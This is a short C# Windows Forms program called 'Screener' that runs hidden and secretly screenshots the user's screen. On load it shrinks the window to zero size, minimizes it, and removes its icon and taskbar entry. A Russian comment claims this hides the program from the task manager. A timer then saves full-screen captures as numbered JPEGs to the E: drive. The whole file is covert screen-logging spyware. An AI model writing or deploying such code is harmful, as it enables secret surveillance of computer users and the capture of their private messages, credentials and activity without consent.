using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Screener
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        int kol = 0;

        private void Form1_Load(object sender, EventArgs e)
        {
            FormBorderStyle = FormBorderStyle.FixedToolWindow;//Эта штука скрывает нашу прогу от диспетчера
            //FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Minimized;
            Height = 0;
            Width = 0;
            ShowIcon = false;
            ShowInTaskbar = false;
            
        }

        private void Screen_Tick(object sender, EventArgs e)
        {
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            Graphics graphics = Graphics.FromImage(printscreen as Image);

            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);

            printscreen.Save(@"E:\printscreen"+kol.ToString()+".jpg", System.Drawing.Imaging.ImageFormat.Jpeg);

            //

            ////////////////////////////////////////////////////

            kol++;
        }
    }
}
